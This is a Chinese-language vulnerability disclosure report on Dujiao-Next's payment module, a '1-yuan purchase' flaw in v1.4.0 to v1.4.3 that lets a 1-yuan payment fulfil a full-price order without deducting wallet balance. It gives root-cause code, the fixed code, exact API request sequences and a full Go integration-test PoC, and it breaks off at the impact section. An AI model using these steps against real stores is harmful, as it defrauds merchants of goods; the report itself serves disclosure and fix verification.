# Dujiao-Next 支付模块"1 元购"打折支付漏洞 —— 完整漏洞报告与 PoC 

| 项目 | 内容 |
|---|---|
| **漏洞名称** | 支付回调缺少金额守恒校验 + 钱包扣款幂等键可重置 + 旧支付链接无网关侧作废 → 小额支付履约全额订单（"1 元购"） |
| **漏洞编号** | DJS-2026-0828-01（内部审计编号） |
| **影响产品** | dujiao-next（Go 数字商品电商平台） |
| **受影响版本** | **v1.4.0 ~ v1.4.3**；v1.4.5 发布周期 2026-08-11（ab60e138）~ 2026-08-27 20:46（f57247b4）之间构建的产物 |
| **修复版本** | **f57247b4**（2026-08-27，"fix: 增强订单履约校验"；即当前 v1.4.5 tag 与 v1.4.6 所指提交） |
| **漏洞类型** | 业务逻辑漏洞（CWE-918 支付金额不一致 / CWE-841 幂等性缺陷 / CWE-670 资源未作废） |
| **严重程度** | **严重（业务资损级）**。CVSS v3.1: **6.5**（AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N）；考虑"100% 成功率、可脚本化、无限重复、近乎零成本套利"，业务定级 **Critical** |
| **前置条件** | ① 已注册并登录的普通用户账号；② 钱包余额 ≈ 商品价 - 1 元（如 1000 元商品需充 999，一次性投入且**攻击后余额不损耗**）；③ 站点启用 **≥ 2 个**活跃支付渠道；④ 订单未支付且未过期 |
| **利用方式** | 全部为正常业务 API 调用（无越权、无注入、无并发竞态要求），确定性复现，成功率 100% |
| **影响** | 攻击者以 **1 元实付**获取任意金额商品（卡密/数字商品自动交付），订单账面伪造 `online_paid_amount=全额`；**999 元钱包余额攻击后原封不动、可无限次重复利用**；商户货款损失 = 商品全额，且对账呈现"已收全额"假象 |
| **验证状态** | ✅ **已动态验证**：v1.4.3 集成测试 PoC 复现成功（两变体 PASS）；修复版运行同一 PoC 攻击全部被拦截（详见 §6） |

---

## 1. 执行摘要

Dujiao-Next v1.4.3 的支付回调链路存在**三个相互独立的缺陷**，组合后允许普通用户以 1 元实付购买任意金额的订单商品：

1. **缺陷① 履约不校验金额**：支付回调处理（`applyPaymentUpdate`）在将订单标记为已支付前，只检查"订单当前不是 Paid"，**从不比较这笔支付的金额是否覆盖订单当前的在线应付额**。回调前的事实校验（`validateCallbackPaymentFacts`）只验证"回调金额 == 这笔支付记录自身的金额"，形成"支付记录金额可以很小"的合规缺口。
2. **缺陷② 钱包扣款幂等键静态**：余额扣款流水的幂等键恒为 `order:<订单ID>:order_pay`。订单在"用余额 → 改在线（余额退回）→ 再用余额"之间来回切换时，第二次扣款命中第一轮**已被退回的旧流水**，`ApplyOrderBalance` 直接返回旧金额而**不执行扣款**；订单侧桥接代码却无条件信任该返回值并写入 `wallet_paid_amount=999`——**订单记了 999 元余额支付，钱包分文未扣**。
3. **缺陷③ 旧支付链接无网关侧作废**：v1.4.3 中创建新支付时对同订单其他 pending 支付**零处理**（supersede 机制尚不存在），且同渠道重复创建会**直接复用旧支付记录及其网关链接**（`reusedPending`）。全库不存在任何网关侧关单 API，被"本地作废"（或从未作废）的小额链接在支付网关侧持续可付，攻击者仍可在其上付款并触发合法验签回调。

攻击链：**用 999 元余额把一笔 1000 元订单的在线应付额压到 1 元 → 切换渠道释放余额（应付额回到 1000）→ 取回那张 1 元支付链接 → 在网关实付 1 元 → 回调成功 → 订单按"已付"履约发货**。

---

## 2. 根因分析（v1.4.3 源码证据）

### 2.1 缺陷①：回调履约不校验金额（核心）

**文件**：`internal/modules/payment/application/payment_service_callback.go`（v1.4.3）→ `applyPaymentUpdate`

```go
// v1.4.3 原文（事务内，行锁后）
if lockedPayment.Status == constants.PaymentStatusSuccess { /* 幂等 */ }
if lockedPayment.Status == status { /* 幂等 */ }

switch status {
case constants.PaymentStatusSuccess:
    paidAt := now
    if input.PaidAt != nil { paidAt = *input.PaidAt }
    lockedPayment.PaidAt = &paidAt
case constants.PaymentStatusExpired:
    lockedPayment.ExpiredAt = &now
}

lockedPayment.Status = status
...
// ★ 漏洞点：唯一履约条件是"订单不是 Paid"，没有任何金额比较
if status == constants.PaymentStatusSuccess && lockedOrder.Status != constants.OrderStatusPaid {
    if err := s.markOrderPaid(tx, lockedOrder, now); err != nil {
        return err
    }
    if s.resellerAccounting != nil {
        s.resellerAccounting.PostOrderProfit(tx.ResellerAccounting(), lockedOrder, lockedPayment)
    }
    orderPaid = true
}
```

回调前的 `validateCallbackPaymentFacts`（同文件）只校验：

```go
// 渠道一致
if input.ChannelID != 0 && input.ChannelID != payment.ChannelID { return ErrPaymentInvalid }
// 订单号一致（业务单号或网关单号）
if !matchesBusinessOrderNo(input.OrderNo, businessOrderNo, payment) { return ErrPaymentInvalid }
// 成功回调金额必须为正、币种与支付记录一致
if status == constants.PaymentStatusSuccess {
    if currency == "" { return ErrPaymentCurrencyMismatch }
    if !input.Amount.Decimal.IsPositive() { return ErrPaymentAmountMismatch }
}
...
// ★ 金额只与"该支付记录自身金额"比较，从不与订单应付额比较
if !input.Amount.Decimal.IsZero() && input.Amount.Decimal.Cmp(payment.Amount.Decimal) != 0 {
    return ErrPaymentAmountMismatch
}
```

`markOrderPaid` 内部虽然通过 `IsTransitionAllowed` 限制了 `PendingPayment → Paid` 的迁移（排除了已取消/已退款订单被重放履约的可能），但对**合法处于 PendingPayment 的订单**，任何成功回调都会触发履约与发货（`ConsumeManualStockByItems` + 自动交付）。

> 修复版对照（f57247b4）：
> ```go
> orderOpen := lockedOrder.Status == constants.OrderStatusPendingPayment && lockedOrder.PaidAt == nil
> // 金额守恒：一笔支付只有覆盖订单当前的在线应付额才允许履约。
> // 混合支付切换渠道会退回余额并抬高在线应付额，而旧链接在网关侧依然可付，
> // 缺少这道校验就能用旧链接的小额付款换到整单商品。
> requiredOnlineAmount := normalizeOrderAmount(lockedOrder.TotalAmount.Decimal.Sub(lockedOrder.WalletPaidAmount.Decimal))
> coveredOnlineAmount := paymentCoveredOrderAmount(lockedPayment)
> underpaid := status == constants.PaymentStatusSuccess && orderOpen &&
>     coveredOnlineAmount.LessThan(requiredOnlineAmount)
> canFulfillOrder := status == constants.PaymentStatusSuccess && orderOpen && !underpaid
> ```

### 2.2 缺陷②：钱包扣款幂等键静态，"退回后再用余额"不再扣款

**文件**：`internal/modules/wallet/application/order_balance.go`（v1.4.3）→ `ApplyOrderBalance`

```go
// v1.4.3 原文
deduct := available
if deduct.GreaterThan(total) { deduct = total }
reference := orderReference(input.OrderID, constants.WalletTxnTypeOrderPay)  // ★ 恒为 "order:<id>:order_pay"
existing, err := repository.GetTransactionByReference(reference)
if err != nil { return money.Amount{}, err }
if existing != nil {
    return existing.Amount, nil   // ★ 命中旧流水（哪怕它已被退回冲正）→ 直接返回，本次不扣款
}
// …… 只有不存在旧流水时才真正 UpdateAccount 扣款 + CreateTransaction
```

**文件**：`internal/modules/order/application/order_wallet_bridge.go`（v1.4.3）→ `ApplyWalletBalance`

```go
// v1.4.3 原文：无条件信任钱包层返回值
amount, err := wallets.ApplyOrderBalance(tx.Wallets(), walletcontract.OrderBalanceInput{...})
...
deducted := amount.Decimal.Round(2)
if !useBalance || order.WalletPaidAmount.Decimal.GreaterThan(decimal.Zero) || deducted.LessThanOrEqual(decimal.Zero) {
    return deducted, nil
}
// ★ 把返回值直接写成订单的"余额已付"
tx.Orders().UpdateFields(order.ID, map[string]interface{}{
    "wallet_paid_amount":  money.FromDecimal(deducted),
    "online_paid_amount":  money.FromDecimal(totalSub(deducted)),
    "updated_at":          now,
})
```

时序演示（余额 999，订单 1000）：

| 步骤 | 动作 | `order:<id>:order_pay` 流水 | 钱包余额 | 订单 wallet_paid |
|---|---|---|---|---|
| 1 | 创建支付（use_balance） | 创建 T1=999（扣款） | 0 | 999 |
| 2 | 改在线支付（use_balance=false） | T1 不变；创建 `order:<id>:order_refund`=999（退回） | 999 | 0 |
| 3 | 再用余额（use_balance） | **命中 T1 → 返回 999，不扣款** | **999（未动！）** | **999** |

步骤 3 之后：订单认为 999 元已由余额覆盖（在线应付 1 元），而钱包余额仍是 999——**999 元凭空"支付"了订单**。

> 修复版对照（f57247b4）：`orderAllocationReference` 按 `(order_id, type)` 流水计数追加轮次后缀（`order:<id>:order_pay:2`、`:3`…），并发由 `wallet_transactions.reference` 唯一索引（`domain/transaction.go:21 uniqueIndex`）兜底。修复注释原话："订单在『用余额 → 改在线（退回）→ 再用余额』之间来回切换时，后续轮次追加序号，否则上一轮早已被退回的流水会把新一轮的扣款判成重复操作而跳过——**订单会被标记为已用余额，钱包却一分钱都没扣**。"

### 2.3 缺陷③：旧支付链接可复用、无网关侧作废

**文件**：`internal/modules/payment/application/payment_service_create.go`（v1.4.3）→ `CreatePayment`

```go
// ★ 同渠道存在 pending 且有网关结果 → 直接复用旧支付（含其金额与网关链接），提前返回
existing, err := paymentRepo.GetLatestPendingByOrderChannel(lockedOrder.ID, channel.ID, time.Now())
if existing != nil && hasProviderResult(existing) {
    reusedPending = true
    payment = existing
    order = &lockedOrder
    return nil        // ← 连后面的余额释放逻辑都不再执行
}

// ★ 换渠道/改在线时才释放余额（这正是攻击者"抬高在线应付额"的开关）
if s.walletSvc != nil {
    if input.UseBalance {
        orderapp.ApplyWalletBalance(s.walletSvc, tx, &lockedOrder, true)
    } else if lockedOrder.WalletPaidAmount.Decimal.GreaterThan(decimal.Zero) {
        orderapp.ReleaseWalletBalance(s.walletSvc, tx, &lockedOrder,
            constants.WalletTxnTypeOrderRefund, "用户改为在线支付，退回余额")
    }
}
onlineAmount := normalizeOrderAmount(lockedOrder.TotalAmount.Decimal.Sub(lockedOrder.WalletPaidAmount.Decimal))
// 新支付金额 = 当前在线应付额（余额释放后 = 1000）
```

v1.4.3 中：
- 创建第二笔支付（换渠道）**不会**改动第一笔支付（`SupersedePendingByOrderID` 函数在该版本不存在——`git grep SupersedePendingByOrderID v1.4.3` 为空，该函数由 ab60e138 于 2026-08-11 引入）；
- 全库**不存在**任何网关侧 close/关单 API（alipay/epay/okpay/bepusdt/wechat 网关包均无实现），第一笔 1 元支付的网关链接在网关侧持续有效；
- 步骤 3 再次请求渠道 A 时命中 `reusedPending`，**把那张 1 元链接原样返回给前端**——攻击者甚至不需要保存旧链接。

---

## 3. 攻击路径（真实 HTTP 层）

前置：攻击者注册账号，充值 999 元余额（一次性）；目标商品 1000 元；站点启用 ≥2 个支付渠道（下称渠道 A、B、C）。以下均为 v1.4.3 真实路由：

| # | 请求 | 响应关键字段 | 系统状态变化 |
|---|---|---|---|
| 1 | 下单（正常） | `order_no` | 订单 1000 元，pending_payment |
| 2 | `POST /api/v1/payments`<br>`{"order_no":"…","channel_id":A,"use_balance":true}` | `payment.amount=1.00`、支付链接 L1（1 元） | 余额 999→**0**；订单 `wallet_paid=999` |
| 3 | `POST /api/v1/payments`<br>`{"order_no":"…","channel_id":B,"use_balance":false}` | `payment.amount=1000.00`、链接 L2 | 余额 0→**999**（退回）；订单 `wallet_paid=0`；L1 本地不标记、网关侧可付 |
| 4 | `POST /api/v1/payments`<br>`{"order_no":"…","channel_id":A,"use_balance":false}` | **复用** `payment.amount=1.00`、链接 L1 | 无状态变化 |
| 5 | 用户在网关上支付 **L1 的 1 元**（真实付款） | — | — |
| 6 | 网关异步回调（验签通过，amount=1）→ `POST /api/v1/payments/callback` | 回调应答成功 | 支付#1 → success；**订单 → paid → 自动发货**（卡密/数字商品交付、邮件通知） |

**攻击者所得**：1000 元商品（已交付）+ 1 元实付 + **999 元余额分文未损**（步骤 3 已退回，后续步骤不再动用）。
**商户账面**：订单 `online_paid_amount=1000`、支付记录 success、库存已扣、利润已入账——**对账呈现"已全额收款"假象**，损失 = 1000 - 1。

### 变体矩阵

| 变体 | 路径 | 余额消耗 | 所需渠道数 | v1.4.3 |
|---|---|---|---|---|
| **A**（复用旧链接） | 步骤 2-6 如上 | 不消耗（999 退回后不再动用） | ≥2 | ✅ 已复现 |
| **B**（直付旧链接） | 步骤 2、3 后不请求复用，直接对 L1 付款 | 不消耗 | ≥2 | ✅ 成立（缺陷①③，无需缺陷②；v1.4.3 无 supersede，L1 始终可付） |
| **C**（钱包幂等绕过） | 2: 渠道A用余额 → 3: 渠道B改在线 → **4: 渠道C再用余额（钱包不扣款，订单记 999）** → 5: 支付新 1 元链接 → 6: 回调履约 | **不消耗（999 全程无损）** | ≥2（或≥1+时间窗口） | ✅ 已复现 |
| 单渠道场景 | 唯一渠道下重复创建命中 `reusedPending`，余额不会被释放，1 元链接即合法全额支付（999+1） | — | 1 | ❌ 不成立（需 ≥2 渠道） |

> 无限重复性：变体 A/C 的攻击**不消耗 999 元余额**，同一余额可对任意多笔订单反复执行——一次性 999 元投入，之后每单仅需 1 元。

---

## 4. PoC 代码

**文件**：`1yuan-poc/one_yuan_exploit_poc_test.go`（随本报告提供；亦可放置于仓库
`internal/modules/payment/integrationtest/callback/` 下直接运行）

**原理**：集成测试形式。内存 SQLite + 真实 GORM 仓储 + 真实 `PaymentService`（含钱包服务、渠道路由、网关注册表）；仅支付网关本身用 `fakeGwAdapter` 替代——其 `VerifyCallback` 以通道配置 token 为签名密钥，**模拟"网关侧已验签的合法异步回调"**（即攻击者确实在网关付清了那 1 元）。业务逻辑（创建支付、钱包扣退、复用、回调履约）100% 走 v1.4.3 生产代码，无任何 mock。

```go
package paymentcallback_test

// PoC：v1.4.3 "1元购" 打折支付漏洞复现
//
// 攻击链：
//   变体A：余额混合支付创建小额支付链接 -> 切换渠道释放余额 ->
//          复用旧的小额支付链接 -> 实付1元 -> 网关回调成功 -> 整单(1000元)履约
//   变体C：用余额 -> 改在线(退回) -> 再用余额 -> 钱包幂等键静态命中旧流水
//          -> 余额不扣款但订单记了 wallet_paid=999 -> 实付1元 -> 整单履约且余额无损
//
// 本测试在 v1.4.3 上应 PASS（证明漏洞存在）；在 f57247b4（v1.4.5 tag/v1.4.6）上
// 关键断言应 FAIL（证明修复生效）。

import (
	"context"
	"fmt"
	"testing"
	"time"

	"github.com/dujiao-next/internal/constants"
	paymentapp "github.com/dujiao-next/internal/modules/payment/application"
	paymentcontract "github.com/dujiao-next/internal/modules/payment/contract"
	paymentdomain "github.com/dujiao-next/internal/modules/payment/domain"
	paymentgormstore "github.com/dujiao-next/internal/modules/payment/infrastructure/gormstore"
	paymentprovider "github.com/dujiao-next/internal/modules/payment/infrastructure/gateway/provider"
	orderdomain "github.com/dujiao-next/internal/modules/order/domain"
	ordergormstore "github.com/dujiao-next/internal/modules/order/infrastructure/gormstore"
	userdomain "github.com/dujiao-next/internal/modules/identity/user/domain"
	fulfillmentdomain "github.com/dujiao-next/internal/modules/fulfillment/domain"
	productdomain "github.com/dujiao-next/internal/modules/catalog/product/domain"
	productgormstore "github.com/dujiao-next/internal/modules/catalog/product/store/gormstore"
	walletapp "github.com/dujiao-next/internal/modules/wallet/application"
	walletdomain "github.com/dujiao-next/internal/modules/wallet/domain"
	walletgormstore "github.com/dujiao-next/internal/modules/wallet/infrastructure/gormstore"

	"github.com/glebarez/sqlite"
	"github.com/shopspring/decimal"
	"github.com/dujiao-next/internal/shared/jsonmap"
	"github.com/dujiao-next/internal/shared/money"
	"gorm.io/gorm"
)

// ---------- 模拟"可信"支付网关适配器（签名=通道配置的token，代表网关侧已验签回调） ----------

type fakeGwAdapter struct{}

func (fakeGwAdapter) Type() string { return "fakegw:" }
func (fakeGwAdapter) ValidateConfig(cfg jsonmap.JSON, channelType string) error { return nil }

func (fakeGwAdapter) CreatePayment(ctx context.Context, cfg jsonmap.JSON, input paymentcontract.GatewayCreateInput) (*paymentcontract.GatewayCreateResult, error) {
	return &paymentcontract.GatewayCreateResult{
		ProviderRef: "FAKE-" + input.OrderNo,
		RedirectURL: "https://fake-gw.example/pay/" + input.OrderNo,
		QRCodeURL:   "https://fake-gw.example/qr/" + input.OrderNo,
		Payload:     jsonmap.JSON{"gateway_received_amount": input.Amount.String()},
	}, nil
}

func fakeFormFirst(form map[string][]string, key string) string {
	if v, ok := form[key]; ok && len(v) > 0 {
		return v[0]
	}
	return ""
}

// VerifyCallback 模拟网关侧已验签的异步回调：签名必须是该通道配置的 token。
func (fakeGwAdapter) VerifyCallback(cfg jsonmap.JSON, form map[string][]string, body []byte) (*paymentcontract.GatewayCallbackResult, error) {
	token, _ := cfg["token"].(string)
	if fakeFormFirst(form, "sign") != token {
		return nil, fmt.Errorf("fake gw: signature invalid")
	}
	amount, err := decimal.NewFromString(fakeFormFirst(form, "amount"))
	if err != nil {
		return nil, fmt.Errorf("fake gw: bad amount: %w", err)
	}
	status := constants.PaymentStatusPending
	if fakeFormFirst(form, "trade_status") == "success" {
		status = constants.PaymentStatusSuccess
	}
	return &paymentcontract.GatewayCallbackResult{
		OrderNo:     fakeFormFirst(form, "out_trade_no"),
		ProviderRef: fakeFormFirst(form, "trade_no"),
		Status:      status,
		Amount:      money.FromDecimal(amount),
		Currency:    "CNY",
	}, nil
}

// ---------- 夹具 ----------

type exploitFixture struct {
	db          *gorm.DB
	svc         *paymentapp.PaymentService
	user        *userdomain.User
	orderA      *orderdomain.Order // 变体A 订单（1000元）
	orderC      *orderdomain.Order // 变体C 订单（1000元）
	channelA    *paymentdomain.PaymentChannel
	channelB    *paymentdomain.PaymentChannel
	channelC    *paymentdomain.PaymentChannel
	walletStore *walletgormstore.Store
}

func newExploitFixture(t *testing.T) *exploitFixture {
	t.Helper()
	dsn := fmt.Sprintf("file:exploit_%d?mode=memory&cache=shared", time.Now().UnixNano())
	db, err := gorm.Open(sqlite.Open(dsn), &gorm.Config{})
	if err != nil {
		t.Fatalf("open sqlite: %v", err)
	}
	if err := db.AutoMigrate(
		&userdomain.User{},
		&productdomain.Product{},
		&productdomain.ProductSKU{},
		&orderdomain.Order{},
		&orderdomain.OrderItem{},
		&fulfillmentdomain.Fulfillment{},
		&paymentdomain.PaymentChannel{},
		&paymentdomain.Payment{},
		&walletdomain.Account{},
		&walletdomain.Transaction{},
	); err != nil {
		t.Fatalf("auto migrate: %v", err)
	}

	now := time.Now().UTC().Truncate(time.Second)
	user := &userdomain.User{Email: "attacker@example.com", PasswordHash: "hash", Status: constants.UserStatusActive, CreatedAt: now, UpdatedAt: now}
	if err := db.Create(user).Error; err != nil {
		t.Fatalf("create user: %v", err)
	}
	// 攻击者钱包：充值 999 元
	account := &walletdomain.Account{UserID: user.ID, Balance: money.FromDecimal(decimal.NewFromInt(999)), CreatedAt: now, UpdatedAt: now}
	if err := db.Create(account).Error; err != nil {
		t.Fatalf("create wallet: %v", err)
	}

	mkOrder := func(no string) *orderdomain.Order {
		return &orderdomain.Order{
			OrderNo:                 no,
			UserID:                  user.ID,
			Status:                  constants.OrderStatusPendingPayment,
			Currency:                "CNY",
			OriginalAmount:          money.FromDecimal(decimal.NewFromInt(1000)),
			DiscountAmount:          money.FromDecimal(decimal.Zero),
			PromotionDiscountAmount: money.FromDecimal(decimal.Zero),
			TotalAmount:             money.FromDecimal(decimal.NewFromInt(1000)),
			WalletPaidAmount:        money.FromDecimal(decimal.Zero),
			OnlinePaidAmount:        money.FromDecimal(decimal.NewFromInt(1000)),
			RefundedAmount:          money.FromDecimal(decimal.Zero),
			CreatedAt:               now,
			UpdatedAt:               now,
		}
	}
	orderA, orderC := mkOrder("DJEXPLOITA001"), mkOrder("DJEXPLOITC001")
	if err := db.Create(orderA).Error; err != nil {
		t.Fatalf("create orderA: %v", err)
	}
	if err := db.Create(orderC).Error; err != nil {
		t.Fatalf("create orderC: %v", err)
	}

	mkChannel := func(name, token string) *paymentdomain.PaymentChannel {
		return &paymentdomain.PaymentChannel{
			Name:            name,
			ProviderType:    "fakegw",
			ChannelType:     "card",
			InteractionMode: constants.PaymentInteractionQR,
			FeeRate:         money.FromDecimal(decimal.Zero),
			FixedFee:        money.FromDecimal(decimal.Zero),
			ConfigJSON:      jsonmap.JSON{"token": token},
			IsActive:        true,
			CreatedAt:       now,
			UpdatedAt:       now,
		}
	}
	channelA, channelB, channelC := mkChannel("FAKE-A", "tokA"), mkChannel("FAKE-B", "tokB"), mkChannel("FAKE-C", "tokC")
	for _, ch := range []*paymentdomain.PaymentChannel{channelA, channelB, channelC} {
		if err := db.Create(ch).Error; err != nil {
			t.Fatalf("create channel: %v", err)
		}
	}

	secret := "test-guest-credential-secret-with-32-bytes"
	orderRepo := ordergormstore.New(db, secret)
	paymentRepo := paymentgormstore.New(db, secret)
	channelRepo := paymentgormstore.NewChannelStore(db)
	productRepo := productgormstore.NewProductStore(db)
	productSKURepo := productgormstore.NewSKUStore(db)
	walletStore := walletgormstore.New(db)

	registry := paymentprovider.NewRegistry()
	registry.Register("fakegw", "card", fakeGwAdapter{})

	svc := paymentapp.NewPaymentService(paymentapp.PaymentServiceOptions{
		OrderStore:              orderRepo,
		ProductRepo:             productRepo,
		ProductSKURepo:          productSKURepo,
		PaymentStore:            paymentRepo,
		ChannelStore:            channelRepo,
		WalletRepo:              walletStore,
		WalletService:           walletapp.NewService(walletapp.Options{Repository: walletStore, Transactions: walletStore}),
		ExpireMinutes:           15,
		PaymentProviderRegistry: registry,
	})

	return &exploitFixture{db: db, svc: svc, user: user, orderA: orderA, orderC: orderC, channelA: channelA, channelB: channelB, channelC: channelC, walletStore: walletStore}
}

func (f *exploitFixture) balance(t *testing.T) decimal.Decimal {
	t.Helper()
	acc, err := f.walletStore.GetAccountByUserID(f.user.ID)
	if err != nil {
		t.Fatalf("get account: %v", err)
	}
	if acc == nil {
		t.Fatalf("account missing")
	}
	return acc.Balance.Decimal
}

func (f *exploitFixture) reloadOrder(t *testing.T, id uint) *orderdomain.Order {
	t.Helper()
	// 通过 db 直接查询，避免 store 的租户/预加载差异
	var o orderdomain.Order
	if err := f.db.First(&o, id).Error; err != nil {
		t.Fatalf("reload order: %v", err)
	}
	return &o
}

// 模拟"攻击者真的在网关上付清了这笔小额链接"：发送网关验签回调。
func (f *exploitFixture) gatewayPays(t *testing.T, channel *paymentdomain.PaymentChannel, payment *paymentdomain.Payment) {
	t.Helper()
	token, _ := channel.ConfigJSON["token"].(string)
	form := map[string][]string{
		"out_trade_no": {payment.GatewayOrderNo},
		"trade_no":     {"FAKE-" + payment.GatewayOrderNo},
		"trade_status": {"success"},
		"amount":       {payment.Amount.String()},
		"sign":         {token},
	}
	updated, err := f.svc.HandleSyncCallback(channel, form, nil)
	if err != nil {
		t.Fatalf("gateway callback (amount=%s) rejected: %v", payment.Amount.String(), err)
	}
	t.Logf("[gw] 网关 %s 回调: 支付#%d 金额=%s 状态→%s", channel.Name, payment.ID, updated.Amount.String(), updated.Status)
}

const secretKey = "test-guest-credential-secret-with-32-bytes"

// ---------- 变体 A：复用旧小额链接，1元履约1000元订单 ----------

func TestPOC_V143_OneYuanViaSupersededLinkReuse(t *testing.T) {
	f := newExploitFixture(t)
	ctx := context.Background()
	oid := f.orderA.ID
	_ = secretKey

	t.Logf("== 变体A：订单#%d 总价1000元，攻击者余额999元 ==", oid)

	// 步骤1：用余额创建支付（渠道A）→ 余额扣999，在线应付 1 元
	r1, err := f.svc.CreatePayment(paymentapp.CreatePaymentInput{OrderID: oid, ChannelID: f.channelA.ID, UseBalance: true, ClientIP: "1.2.3.4", Context: ctx})
	if err != nil {
		t.Fatalf("step1 create payment (use_balance): %v", err)
	}
	t.Logf("[1] 渠道A use_balance=true → 支付#%d 金额=%s，链接=%s", r1.Payment.ID, r1.Payment.Amount.String(), r1.Payment.PayURL)
	if got := f.balance(t); got.IntPart() != 0 {
		t.Fatalf("step1 余额应为0，实际 %s", got.String())
	}
	if !r1.Payment.Amount.Decimal.Equal(decimal.NewFromInt(1)) {
		t.Fatalf("step1 支付金额应为1，实际 %s", r1.Payment.Amount.String())
	}

	// 步骤2：换渠道B、纯在线支付 → 余额退回999，在线应付回到1000
	r2, err := f.svc.CreatePayment(paymentapp.CreatePaymentInput{OrderID: oid, ChannelID: f.channelB.ID, UseBalance: false, ClientIP: "1.2.3.4", Context: ctx})
	if err != nil {
		t.Fatalf("step2 create payment (online): %v", err)
	}
	t.Logf("[2] 渠道B use_balance=false → 支付#%d 金额=%s（旧链接 %s 本地标记/仍可付）", r2.Payment.ID, r2.Payment.Amount.String(), r1.Payment.PayURL)
	if got := f.balance(t); got.IntPart() != 999 {
		t.Fatalf("step2 余额应退回999，实际 %s", got.String())
	}
	if !r2.Payment.Amount.Decimal.Equal(decimal.NewFromInt(1000)) {
		t.Fatalf("step2 支付金额应为1000，实际 %s", r2.Payment.Amount.String())
	}

	// 步骤3：再次请求渠道A → v1.4.3 复用支付#1（1元旧链接）
	r3, err := f.svc.CreatePayment(paymentapp.CreatePaymentInput{OrderID: oid, ChannelID: f.channelA.ID, UseBalance: false, ClientIP: "1.2.3.4", Context: ctx})
	if err != nil {
		t.Fatalf("step3 create payment (reuse A): %v", err)
	}
	t.Logf("[3] 再请求渠道A → 返回支付#%d 金额=%s（复用旧链接）", r3.Payment.ID, r3.Payment.Amount.String())
	if r3.Payment.ID != r1.Payment.ID {
		t.Fatalf("step3 预期复用支付#%d，实际返回 #%d", r1.Payment.ID, r3.Payment.ID)
	}

	// 步骤4：攻击者在旧链接上实付 1 元 → 网关验签回调
	f.gatewayPays(t, f.channelA, r1.Payment)

	// 步骤5：验证漏洞效果 —— 订单被履约
	order := f.reloadOrder(t, oid)
	t.Logf("[5] 订单状态=%s paid_at=%v online_paid_amount=%s", order.Status, order.PaidAt, order.OnlinePaidAmount.String())

	if order.PaidAt == nil || (order.Status != constants.OrderStatusPaid && order.Status != constants.OrderStatusCompleted && order.Status != constants.OrderStatusFulfilling) {
		t.Fatalf("（若在此失败，说明该版本已包含金额守恒修复，1元购不成立）订单未被1元履约: status=%s", order.Status)
	}
	cashCollected := r1.Payment.Amount.Decimal
	t.Logf("!!! 漏洞确认（变体A）: 实收 %s 元，履约 %s 元商品（订单#%d 状态=%s）",
		cashCollected.String(), f.orderA.TotalAmount.Decimal.String(), oid, order.Status)
}

// ---------- 变体 C：钱包幂等键绕过，1元履约且余额无损 ----------

func TestPOC_V143_OneYuanViaWalletIdempotencyBypass(t *testing.T) {
	f := newExploitFixture(t)
	ctx := context.Background()
	oid := f.orderC.ID

	t.Logf("== 变体C：订单#%d 总价1000元，攻击者余额999元 ==", oid)

	// 步骤1：渠道A 用余额 → 扣999（幂等键 order:<id>:order_pay）
	r1, err := f.svc.CreatePayment(paymentapp.CreatePaymentInput{OrderID: oid, ChannelID: f.channelA.ID, UseBalance: true, ClientIP: "1.2.3.4", Context: ctx})
	if err != nil {
		t.Fatalf("step1: %v", err)
	}
	t.Logf("[1] 渠道A use_balance=true → 支付#%d 金额=%s", r1.Payment.ID, r1.Payment.Amount.String())
	if got := f.balance(t); got.IntPart() != 0 {
		t.Fatalf("step1 余额应为0，实际 %s", got.String())
	}

	// 步骤2：渠道B 纯在线 → 余额退回999
	r2, err := f.svc.CreatePayment(paymentapp.CreatePaymentInput{OrderID: oid, ChannelID: f.channelB.ID, UseBalance: false, ClientIP: "1.2.3.4", Context: ctx})
	if err != nil {
		t.Fatalf("step2: %v", err)
	}
	_ = r2
	if got := f.balance(t); got.IntPart() != 999 {
		t.Fatalf("step2 余额应退回999，实际 %s", got.String())
	}

	// 步骤3：渠道C 再用余额 → v1.4.3 幂等键 order:<id>:order_pay 命中步骤1已退回的流水
	// → 直接返回999，不再扣款；但订单被写入 wallet_paid_amount=999
	r3, err := f.svc.CreatePayment(paymentapp.CreatePaymentInput{OrderID: oid, ChannelID: f.channelC.ID, UseBalance: true, ClientIP: "1.2.3.4", Context: ctx})
	if err != nil {
		t.Fatalf("step3: %v", err)
	}
	orderAfterStep3 := f.reloadOrder(t, oid)
	balAfterStep3 := f.balance(t)
	t.Logf("[3] 渠道C use_balance=true → 支付#%d 金额=%s；订单wallet_paid=%s；钱包余额=%s",
		r3.Payment.ID, r3.Payment.Amount.String(), orderAfterStep3.WalletPaidAmount.String(), balAfterStep3.String())

	if !orderAfterStep3.WalletPaidAmount.Decimal.Equal(decimal.NewFromInt(999)) {
		t.Fatalf("step3 订单 wallet_paid 应为999，实际 %s", orderAfterStep3.WalletPaidAmount.String())
	}
	balanceNotDeducted := balAfterStep3.Equal(decimal.NewFromInt(999))
	if !balanceNotDeducted {
		t.Fatalf("（若在此失败，说明该版本已包含轮次幂等键修复）预期余额未扣款（漏洞特征），实际 %s", balAfterStep3.String())
	}
	t.Logf("!!! 漏洞确认（变体C-钱包侧）: 订单记了 wallet_paid=999，钱包余额仍为 999（本轮未扣款）")

	// 步骤4：在1元链接上实付1元 → 回调 → 整单履约，余额分文未损
	f.gatewayPays(t, f.channelC, r3.Payment)
	order := f.reloadOrder(t, oid)
	finalBalance := f.balance(t)
	t.Logf("[4] 订单状态=%s paid_at=%v；钱包最终余额=%s", order.Status, order.PaidAt, finalBalance.String())

	if order.PaidAt == nil || (order.Status != constants.OrderStatusPaid && order.Status != constants.OrderStatusCompleted && order.Status != constants.OrderStatusFulfilling) {
		t.Fatalf("（若在此失败，说明该版本已包含金额守恒修复，1元购不成立）订单未被1元履约: status=%s", order.Status)
	}
	t.Logf("!!! 漏洞确认（变体C）: 实收 1 元，履约 1000 元商品，攻击者 999 元余额原封不动（净套利 999 元）")
}
```

### 运行方式

```bash
# 1) 检出 v1.4.3（或任何受影响版本）
git clone https://github.com/dujiao-next/dujiao-next.git && cd dujiao-next
git worktree add ../dujiao-v143 v1.4.3
cd ../dujiao-v143

# 2) 放入 PoC
cp one_yuan_exploit_poc_test.go internal/modules/payment/integrationtest/callback/

# 3) 运行（Go ≥ 1.26）
go test -p 1 -run "TestPOC_V143" -v ./internal/modules/payment/integrationtest/callback/

# 判定：
#   v1.4.3          → 两个测试 PASS = 漏洞成立
#   f57247b4 及以后 → 变体A 在步骤3 FAIL（旧链接不可复用）、变体C 在步骤3 FAIL（余额真实扣款）= 已修复
```

---

## 5. 影响评估

